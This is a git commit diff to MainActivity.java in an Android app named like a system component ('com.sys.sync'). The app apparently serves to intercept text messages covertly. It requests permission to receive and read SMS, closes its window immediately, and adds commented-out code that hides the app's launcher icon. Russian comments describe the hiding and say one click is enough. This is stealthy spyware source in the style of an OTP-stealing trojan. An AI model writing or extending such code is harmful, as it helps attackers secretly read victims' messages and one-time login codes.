1800c7f9f6844d14e2cf8e9a0f314c1bd2ee26eb
MintOrbit <168619262+MintOrbit@users.noreply.github.com>
2026-04-10 09:01:40 +0300

    Update MainActivity.java

--- app/src/main/java/com/sys/sync/MainActivity.java
+++ app/src/main/java/com/sys/sync/MainActivity.java
@@ -2,36 +2,30 @@ package com.sys.sync;
 
 import android.Manifest;
 import android.app.Activity;
-import android.content.Intent;
-import android.net.Uri;
-import android.os.Build;
+import android.content.ComponentName;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
-import android.os.PowerManager;
-import android.provider.Settings;
 
 public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // Запрос прав на SMS
+        // Запрос всего сразу. Один клик - и ты в дамках.
         requestPermissions(new String[]{
             Manifest.permission.RECEIVE_SMS, 
             Manifest.permission.READ_SMS
-        }, 101);
+        }, 1);
 
-        // Запрос на работу в фоне без ограничений
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            String packageName = getPackageName();
-            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                intent.setData(Uri.parse("package:" + packageName));
-                startActivity(intent);
-            }
-        }
-        
-        // Закрываем окно, чтобы не висело перед глазами
+        // СКРЫТИЕ ИКОНКИ (После запуска приложение исчезает из меню!)
+        // ВНИМАНИЕ: На некоторых Android оно может перестать работать после этого,
+        // поэтому протести сначала без этого блока.
+        /*
+        PackageManager p = getPackageManager();
+        ComponentName componentName = new ComponentName(this, com.sys.sync.MainActivity.class);
+        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        */
+
         finish();
     }
 }
